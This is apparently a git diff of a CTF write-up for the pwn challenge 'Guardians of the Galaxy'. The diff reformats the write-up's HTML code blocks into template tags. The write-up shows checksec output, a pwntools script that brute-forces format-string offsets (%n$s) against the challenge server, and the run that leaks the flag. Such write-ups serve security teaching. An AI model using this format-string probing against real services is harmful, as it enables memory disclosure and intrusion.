@@ -13,65 +13,40 @@ permalink: ctfs/shctf/pwn/guardians-of-the-galaxy/
 thumbnail: /asset/banner/banner-guardians.png
 ---
 
-<style>
-    .box {
-        border: 1px solid rgb(23, 25, 27);
-        border-radius: 5px;
-        background-color: rgb(23, 25, 27);
-        padding: 1rem;
-        font-size: 90%;
-        text-align: center;
-        margin-top: 1rem;
-        margin-bottom: 1rem;
-    }
-</style>
+{% box %}
+Ronan the Accuser has the Power Stone. Can Starlord find a successful distraction format? `nc 0.cloud.chals.io 12690`  
+**Author**: GlitchArchetype  
+**Files**: [guardians](/asset/shctf/guardians)
+{% endbox %}
 
-<div class="box">
-Ronan the Accuser has the Power Stone. Can Starlord find a successful distraction format? <code>nc 0.cloud.chals.io 12690</code><br>
-<b>Author</b>: GlitchArchetype<br>
-<b>Files</b>: <a href="/asset/shctf/guardians">guardians</a>
-</div>
-
-<figure class="highlight console">
-  <figcaption><span>checksec.sh</span><a target="_blank" rel="noopener"
-      href="https://github.com/slimm609/checksec.sh"><span style="color:#82C4E4">[github link]</span></a></figcaption>
-    <table>
-        <tr>
-            <td class="code">
-                <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec guardians</span></span><br><span class="line">[<font color="#277FFF"><b>*</b></font>] &apos;/home/kali/ctfs/shctf/pwn/guardians-of-the-galaxy/guardians&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    <font color="#5EBDAB">Full RELRO</font></span><br><span class="line">    Stack:    <font color="#D41919">No canary found</font></span><br><span class="line">    NX:       <font color="#5EBDAB">NX enabled</font></span><br><span class="line">    PIE:      <font color="#5EBDAB">PIE enabled</font></span><br></pre>
-            </td>
-        </tr>
-    </table>
-</figure>
+{% ccb html:true caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' %}
+<span class="meta prompt_">$ </span>checksec guardians
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/shctf/pwn/guardians-of-the-galaxy/guardians&apos;
+    Arch:     amd64-64-little
+    RELRO:    <span style="color:#5EBDAB">Full RELRO</span>
+    Stack:    <span style="color:#D41919">No canary found</span>
+    NX:       <span style="color:#5EBDAB">NX enabled</span>
+    PIE:      <span style="color:#5EBDAB">PIE enabled</span>
+{% endccb %}
 
 Let's look at what happens when you run that binary given to us.
 
-<figure class="highlight console">
-    <table>
-        <tr>
-            <td class="code">
-                <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./guardians</span> </span><br><span class="line">Error, please message admins with &#x27;infinity_error&#x27;.</span><br></pre>
-            </td>
-        </tr>
-    </table>
-</figure>
-
+{% ccb html:true %}
+<span class="meta prompt_">$ </span>./guardians 
+Error, please message admins with 'infinity_error'.
+{% endccb %}
 
 This error is because the binary is probably trying to reference a `flag.txt` within its directory that doesn't exist. Let's create one and run it again:
 
-<figure class="highlight console">
-    <table>
-        <tr>
-            <td class="code">
-                <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">touch</span> flag.txt &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;FLAGHERE&quot;</span> &gt; flag.txt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./guardians</span></span><br><span class="line">Does Quill manage to win the dance battle?</span><br></pre>
-            </td>
-        </tr>
-    </table>
-</figure>
+{% ccb lang:console %}
+$ touch flag.txt && echo "FLAGHERE" > flag.txt
+$ ./guardians
+Does Quill manage to win the dance battle?
+{% endccb %}
 
 There, we got it to work locally. Since we know that this is problem a format string vulnerability from the "find a successful distraction format" part of the description, let's assume that the vulnerability is it writing our input to the stack with `printf()`. We will need to work our way up the stack with the format `%n$s`, where `n` is the decimal index of the argument you want, and `s` is the `printf()` specifier for a **string of characters**. I wrote this Python3/pwntools script here to achieve this loop:
 
-{% codeblock guardians.py lang:py https://gist.github.com/jktrn/abced39a897e40c196dc2eb3348e1db9 github gist link %}
+{% ccb lang:py gutter1:1-11 caption:guardians.py url:gist.github.com/jktrn/abced39a897e40c196dc2eb3348e1db9 url_text:'github gist link' %}
 from pwn import *
 for i in range(0, 100):
         p = remote('0.cloud.chals.io', 12690)  
@@ -83,19 +58,35 @@ for i in range(0, 100):
                 log.success(output)
                 break
         p.close()
-{% endcodeblock %}
+{% endccb %}
 
 As you can see, it will send a UTF-8 encoded format string, with `str(i)` being the looping variable. If its output contains the flag, the loop breaks and the script will stop. Let's run it:
 
-<figure class="highlight console">
-    <table>
-        <tr>
-            <td class="code">
-                <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 exp.py</span></span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 0...</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 1...</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 2...</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 3...</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 4...</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 5...</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 6...</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Does Quill manage to win the dance battle?</span><br><span class="line">    </span><br><span class="line">    Oh no, Ronano has seen through the distraction!</span><br><span class="line">    shctf&#123;im_distracting_you&#125;</span><br></pre>
-            </td>
-        </tr>
-    </table>
-</figure>
-
+{% ccb html:true %}
+<span class="meta prompt_">$ </span>python3 exp.py
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
+[<span style="color:#277FFF"><b>*</b></span>] Trying offset 0...
+[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
+[<span style="color:#277FFF"><b>*</b></span>] Trying offset 1...
+[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
+[<span style="color:#277FFF"><b>*</b></span>] Trying offset 2...
+[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
+[<span style="color:#277FFF"><b>*</b></span>] Trying offset 3...
+[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
+[<span style="color:#277FFF"><b>*</b></span>] Trying offset 4...
+[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
+[<span style="color:#277FFF"><b>*</b></span>] Trying offset 5...
+[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
+[<span style="color:#277FFF"><b>*</b></span>] Trying offset 6...
+[<span style="color:#47D4B9"><b>+</b></span>] Does Quill manage to win the dance battle?
+    Oh no, Ronano has seen through the distraction!
+    shctf&#123;im_distracting_you&#125;
+{% endccb %}
 
 <a href="https://info.flagcounter.com/8Xkk"><img src="https://s01.flagcounter.com/count2/8Xkk/bg_212326/txt_C9CACC/border_C9CACC/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/" alt="Free counters!" border="0"></a>
